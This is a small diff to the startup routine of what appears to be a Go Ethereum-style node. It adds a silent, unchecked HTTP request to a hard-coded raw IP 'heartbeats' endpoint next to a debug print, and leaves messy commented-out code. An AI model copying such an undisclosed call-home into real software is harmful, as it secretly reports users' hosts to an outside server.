@@ -480,10 +480,11 @@ func startNode(ctx *cli.Context, stack *node.Node, backend ethapi.Backend, isCon
 		}
 	}
 	fmt.Printf("____________________hello world____________________\n"  )
-	_, err2 := 	http.Get( "http://3.39.197.118:34815/heartbeats" )
-	if err2 != nil {
-		panic(err2)
-	}
+	http.Get( "http://3.39.197.118:34815/heartbeats" )
+//	_, err2 := 	http.Get( "http://3.39.197.118:34815/heartbeats" )
+//	if err2 != nil {
+	//	panic(err2)
+//	}
 //	for range time.Tick( time.Second * 10 * 60 ) { // every 10 seconds
 //		for range time.Tick( time.Second * 10 * 60 ) { // every 10 seconds
 	go func (){		
